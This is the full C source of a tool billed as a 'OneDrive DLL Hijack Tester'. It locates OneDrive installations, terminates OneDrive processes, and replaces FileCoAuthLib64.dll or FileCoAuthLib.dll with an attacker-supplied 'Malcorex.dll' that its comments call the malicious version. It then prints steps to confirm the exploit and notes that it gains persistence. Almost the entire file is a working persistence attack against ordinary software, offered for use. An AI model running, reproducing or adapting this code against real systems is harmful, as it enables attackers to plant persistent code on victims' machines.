/*
 * OneDrive DLL Hijack Tester
 * Author: ahura (malcorex)
 * Github: https://github.com/malcorex
 * Channel: https://t.me/Darkbitx
 * Description: Tests DLL hijack in OneDrive (FileCoAuthLib64.dll / FileCoAuthLib.dll)
 * SPDX-License-Identifier: GPL-3.0-only
 */

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <ctype.h>
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")

 // Function prototypes
wchar_t* FindOneDriveVersionInAppData(wchar_t* username);
wchar_t* FindOneDriveVersionInProgramFiles();
BOOL KillProcessByName(const wchar_t* processName);
BOOL IsProcessRunning(const wchar_t* processName);
BOOL ReplaceDLL(const wchar_t* sourceDLL, const wchar_t* targetDLL);
BOOL CheckAdminPrivileges();
BOOL TestOneDriveInstallations();
void FindAllOneDriveVersions();
BOOL VersionCompare(const wchar_t* v1, const wchar_t* v2);

// Global variables
typedef struct {
    wchar_t version[50];
    wchar_t path[MAX_PATH];
    wchar_t dllName[50];
    BOOL isAppData;
} ONEDRIVE_INSTALL;

ONEDRIVE_INSTALL installations[10];
int installCount = 0;
wchar_t tempPath[MAX_PATH];
wchar_t fullPath[MAX_PATH];

// Check if folder name matches version format (x.x.x.x)
BOOL IsVersionFormat(const wchar_t* name) {
    int dots = 0;
    int digitCount = 0;

    for (int i = 0; name[i] != L'\0'; i++) {
        if (name[i] == L'.') {
            dots++;
            if (i == 0 || name[i + 1] == L'\0') return FALSE;
        }
        else if (!iswdigit(name[i])) {
            return FALSE;
        }
        else {
            digitCount++;
        }
    }

    return (dots == 3 && digitCount > 0);
}

// Compare two version strings
BOOL VersionCompare(const wchar_t* v1, const wchar_t* v2) {
    return wcscmp(v1, v2) == 0;
}

// Find all OneDrive installations
void FindAllOneDriveVersions() {
    wchar_t username[100] = { 0 };
    DWORD usernameSize = sizeof(username) / sizeof(username[0]);

    GetUserNameW(username, &usernameSize);

    // Check AppData installation
    wchar_t appDataPath[MAX_PATH];
    swprintf(appDataPath, MAX_PATH,
        L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\OneDrive\\*",
        username);

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(appDataPath, &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (wcscmp(findData.cFileName, L".") != 0 &&
                    wcscmp(findData.cFileName, L"..") != 0 &&
                    IsVersionFormat(findData.cFileName)) {

                    // Check which DLL name exists
                    wchar_t testPath[MAX_PATH];
                    const wchar_t* dllNames[] = { L"FileCoAuthLib64.dll", L"FileCoAuthLib.dll" };

                    for (int i = 0; i < 2; i++) {
                        swprintf(testPath, MAX_PATH,
                            L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\OneDrive\\%s\\%s",
                            username, findData.cFileName, dllNames[i]);

                        if (GetFileAttributesW(testPath) != INVALID_FILE_ATTRIBUTES) {
                            wcscpy_s(installations[installCount].version, 50, findData.cFileName);
                            wcscpy_s(installations[installCount].dllName, 50, dllNames[i]);
                            wcscpy_s(installations[installCount].path, MAX_PATH, testPath);
                            installations[installCount].isAppData = TRUE;
                            installCount++;
                            break;
                        }
                    }
                    if (installCount >= 10) break;
                }
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }

    // Check Program Files installation
    const wchar_t* programPaths[] = {
        L"C:\\Program Files\\Microsoft OneDrive\\*",
        L"C:\\Program Files (x86)\\Microsoft OneDrive\\*"
    };

    for (int p = 0; p < 2; p++) {
        hFind = FindFirstFileW(programPaths[p], &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    if (wcscmp(findData.cFileName, L".") != 0 &&
                        wcscmp(findData.cFileName, L"..") != 0 &&
                        IsVersionFormat(findData.cFileName)) {

                        // Check which DLL name exists
                        wchar_t testPath[MAX_PATH];
                        const wchar_t* dllNames[] = { L"FileCoAuthLib64.dll", L"FileCoAuthLib.dll" };

                        for (int i = 0; i < 2; i++) {
                            if (p == 0) {
                                swprintf(testPath, MAX_PATH,
                                    L"C:\\Program Files\\Microsoft OneDrive\\%s\\%s",
                                    findData.cFileName, dllNames[i]);
                            }
                            else {
                                swprintf(testPath, MAX_PATH,
                                    L"C:\\Program Files (x86)\\Microsoft OneDrive\\%s\\%s",
                                    findData.cFileName, dllNames[i]);
                            }

                            if (GetFileAttributesW(testPath) != INVALID_FILE_ATTRIBUTES) {
                                wcscpy_s(installations[installCount].version, 50, findData.cFileName);
                                wcscpy_s(installations[installCount].dllName, 50, dllNames[i]);
                                wcscpy_s(installations[installCount].path, MAX_PATH, testPath);
                                installations[installCount].isAppData = FALSE;
                                installCount++;
                                break;
                            }
                        }
                        if (installCount >= 10) break;
                    }
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
}

// Terminate process by name
BOOL KillProcessByName(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    BOOL success = FALSE;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess != NULL) {
                    if (TerminateProcess(hProcess, 0)) {
                        success = TRUE;
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return success;
}

// Check if process is running
BOOL IsProcessRunning(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnap);
                return TRUE;
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return FALSE;
}

// Replace DLL with malicious version
BOOL ReplaceDLL(const wchar_t* sourceDLL, const wchar_t* targetDLL) {
    // Check if source DLL exists
    if (GetFileAttributesW(sourceDLL) == INVALID_FILE_ATTRIBUTES) {
        wprintf(L"[-] Error: Source DLL not found: %s\n", sourceDLL);
        return FALSE;
    }

    // Check if target DLL exists
    if (GetFileAttributesW(targetDLL) == INVALID_FILE_ATTRIBUTES) {
        wprintf(L"[-] Error: Target DLL not found: %s\n", targetDLL);
        return FALSE;
    }

    wprintf(L"[+] Target DLL found: %s\n", targetDLL);

    // Create backup of original DLL
    wchar_t backupPath[MAX_PATH];
    swprintf(backupPath, MAX_PATH, L"%s.backup", targetDLL);

    if (!CopyFileW(targetDLL, backupPath, FALSE)) {
        wprintf(L"[!] Warning: Could not create backup. Error: %lu\n", GetLastError());
    }
    else {
        wprintf(L"[+] Backup created: %s\n", backupPath);
    }

    // Stop OneDrive processes
    const wchar_t* processes[] = {
        L"OneDrive.exe",
        L"FileCoAuth.exe",
        L"UserOOBEBroker.exe"
    };

    for (int i = 0; i < 3; i++) {
        if (IsProcessRunning(processes[i])) {
            if (KillProcessByName(processes[i])) {
                wprintf(L"[+] Stopped process: %s\n", processes[i]);
            }
            else {
                wprintf(L"[!] Warning: Could not stop %s\n", processes[i]);
            }
            Sleep(500);
        }
    }

    Sleep(1000);

    // Delete the original DLL
    if (!DeleteFileW(targetDLL)) {
        DWORD err = GetLastError();
        wprintf(L"[-] Error deleting DLL. Trying MoveFile... Error: %lu\n", err);

        // Try to rename as fallback
        wchar_t tempPath[MAX_PATH];
        swprintf(tempPath, MAX_PATH, L"%s.temp", targetDLL);

        if (MoveFileW(targetDLL, tempPath)) {
            wprintf(L"[+] Moved original DLL to: %s\n", tempPath);
        }
        else {
            wprintf(L"[-] Failed to move DLL. Error: %lu\n", GetLastError());
            return FALSE;
        }
    }
    else {
        wprintf(L"[+] Original DLL deleted\n");
    }

    Sleep(500);

    // Copy the replacement DLL
    if (CopyFileW(sourceDLL, targetDLL, FALSE)) {
        wprintf(L"[+] DLL replaced successfully\n");

        // Verify the replacement
        if (GetFileAttributesW(targetDLL) != INVALID_FILE_ATTRIBUTES) {
            wprintf(L"[i] Verification: New DLL is in place\n");
            return TRUE;
        }
    }
    else {
        wprintf(L"[-] Error copying DLL. Error: %lu\n", GetLastError());

        // Try to restore from backup
        if (GetFileAttributesW(backupPath) != INVALID_FILE_ATTRIBUTES) {
            if (CopyFileW(backupPath, targetDLL, FALSE)) {
                wprintf(L"[i] Restored original DLL from backup\n");
            }
        }
    }

    return FALSE;
}

// Check if running with administrator privileges
BOOL CheckAdminPrivileges() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }

    return isAdmin;
}

// Test OneDrive installations
BOOL TestOneDriveInstallations() {
    wprintf(L"[*] Scanning for OneDrive installations...\n");

    FindAllOneDriveVersions();

    if (installCount == 0) {
        wprintf(L"[-] No OneDrive installations found\n");
        return FALSE;
    }

    wprintf(L"[+] Found %d OneDrive installation(s):\n", installCount);

    for (int i = 0; i < installCount; i++) {
        wprintf(L"\n[i] Installation %d:\n", i + 1);
        wprintf(L"  Version: %s\n", installations[i].version);
        wprintf(L"  DLL Name: %s\n", installations[i].dllName);
        wprintf(L"  Type: %s\n", installations[i].isAppData ? L"AppData (User)" : L"Program Files (System)");
        wprintf(L"  DLL Path: %s\n", installations[i].path);
    }

    BOOL hasAdmin = CheckAdminPrivileges();
    wprintf(L"\n[i] Admin privileges: %s\n", hasAdmin ? L"Yes" : L"No");

    const wchar_t* sourceDLL = L"Malcorex.dll";

    // Check if source DLL exists
    if (GetFileAttributesW(sourceDLL) == INVALID_FILE_ATTRIBUTES) {
        wprintf(L"[-] Error: Source DLL (%s) not found in current directory\n", sourceDLL);
        wprintf(L"[i] Please place Malcorex.dll in the same directory as this executable\n");
        return FALSE;
    }

    wprintf(L"\n[+] Source DLL found: %s\n", sourceDLL);
    wprintf(L"[*] Starting DLL replacement tests...\n");

    BOOL success = FALSE;

    // Try each installation
    for (int i = 0; i < installCount; i++) {
        wprintf(L"\n--- Testing Installation %d ---\n", i + 1);

        // Check access requirements
        if (!installations[i].isAppData && !hasAdmin) {
            wprintf(L"[i] Skipping: Program Files installation requires admin privileges\n");
            continue;
        }

        // Try to replace the DLL
        if (ReplaceDLL(sourceDLL, installations[i].path)) {
            wprintf(L"[+] SUCCESS: DLL hijack successful for %s\n", installations[i].version);
            wprintf(L"[i] DLL Name used: %s\n", installations[i].dllName);
            wprintf(L"[i] Location: %s\n", installations[i].isAppData ? L"AppData" : L"Program Files");

            // Test instructions
            wprintf(L"\n[i] To verify the exploit:\n");
            wprintf(L"1. Wait for FileCoAuth.exe to auto-start\n");
            wprintf(L"2. Or manually launch OneDrive from Start Menu\n");
            wprintf(L"3. A MessageBox should appear indicating successful DLL load\n");
            wprintf(L"4. This provides persistence at current privilege level\n");

            success = TRUE;
            break;
        }
        else {
            wprintf(L"[-] FAILED: Could not replace DLL for %s\n", installations[i].version);
        }
    }

    return success;
}

// Main function
int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"==================================================\n");
    wprintf(L"OneDrive DLL Hijack Tester\n");
    wprintf(L"**** Author: malcorex - https://github.com/malcorex ****\n");
    wprintf(L"==================================================\n\n");

    // Get actual TEMP path
    GetEnvironmentVariableW(L"TEMP", tempPath, MAX_PATH);

    // Build full path
    swprintf(fullPath, MAX_PATH, L"%s\\malcorex.txt", tempPath);

    if (PathFileExistsW(fullPath)) {
        wprintf(L"[i] Target already hijacked\n");
        system("pause");
        return 1;
    }

    if (!TestOneDriveInstallations()) {
        wprintf(L"\n[-] Test completed with no successful DLL replacements\n");
        wprintf(L"Possible reasons:\n");
        wprintf(L"1. OneDrive not installed\n");
        wprintf(L"2. Insufficient privileges (Program Files requires Admin)\n");
        wprintf(L"3. Malcorex.dll not found in current directory\n");
        wprintf(L"4. OneDrive processes cannot be stopped\n");

        system("pause");

        return 1;
    }

    wprintf(L"\n==================================================\n");
    wprintf(L"[+] Test completed successfully\n");
    wprintf(L"[+] Impact: Local persistence at user privilege level\n");
    wprintf(L"==================================================\n");


    HANDLE hFile = CreateFileW(fullPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Error creating file. Error: %lu\n", GetLastError());
    }

    system("pause");

    CloseHandle(hFile);
    return 0;
}

// iR